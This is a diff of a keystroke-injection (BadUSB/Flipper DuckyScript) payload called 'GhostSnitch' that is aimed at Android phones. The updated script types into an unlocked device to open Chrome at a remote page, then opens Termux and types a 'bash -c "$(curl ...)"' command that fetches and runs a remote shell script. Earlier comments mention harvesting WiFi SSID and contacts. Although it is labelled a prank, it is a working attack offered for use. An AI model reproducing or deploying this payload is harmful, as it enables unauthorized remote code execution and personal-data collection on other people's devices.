@@ -1,25 +1,51 @@
 REM GhostSnitch Android Payload
 REM Author: TBJr
 REM Description: Executes Android prank script - works without Termux!
-REM Version: 3.0 - Universal Android support via Web APIs
+REM Version: 3.1 - Fixed Chrome opening method (UI navigation instead of shell commands)
 REM 
 REM This payload works on ANY Android device with Chrome (pre-installed on most)
 REM No Termux or special apps required!
+REM 
+REM IMPORTANT: This script uses UI navigation to open Chrome (not shell commands)
+REM Device must be unlocked and on home screen for best results
 
 REM Method 1: Web-based execution (Primary - works on all Android devices)
 REM Opens Chrome and executes script using Web APIs (Web Speech API for TTS)
-GUI r
-DELAY 500
-STRING am start -a android.intent.action.VIEW -d "https://tbjr.github.io/Flipper-payloads/host/ghostsnitch_android.html"
+REM IMPORTANT: Device must be unlocked and on home screen for this to work
+REM 
+REM Step 1: Go to home screen (press home button)
+GUI
+DELAY 1000
+REM Step 2: Open Chrome via app launcher
+REM Try multiple methods to ensure Chrome opens:
+REM Method A: If device has a search bar on home screen, type there
+REM Method B: Open app drawer (varies by device - some use swipe up)
+REM We'll start typing "chrome" which should work in most launchers
+STRING chrome
+DELAY 1500
+REM Step 3: Select Chrome from search results
 ENTER
-DELAY 2000
+DELAY 3000
+REM Step 4: Chrome should now be open - navigate to URL
+REM Chrome address bar auto-focuses when you start typing a URL
+REM If address bar isn't focused, try pressing Ctrl+L or F6 (may not work on all devices)
+STRING https://tbjr.github.io/Flipper-payloads/host/ghostsnitch_android.html
+DELAY 1000
+ENTER
+DELAY 3000
 
 REM Method 2: Fallback - Try Termux if available (for enhanced features)
-REM This provides additional features like WiFi SSID and contacts if Termux API is installed
-GUI r
-DELAY 500
-STRING am start -n com.termux/.HomeActivity
+REM NOTE: This requires Termux to be installed and accessible via app launcher
+REM Step 1: Go to home screen
+GUI
+DELAY 800
+REM Step 2: Search for Termux app
+STRING termux
+DELAY 1200
 ENTER
-DELAY 1500
+DELAY 2000
+REM Step 3: Once Termux opens, execute the script
 STRING bash -c "$(curl -fsSL https://tbjr.github.io/Flipper-payloads/host/ghostsnitch_android.sh)"
+ENTER
+DELAY 500
 ENTER
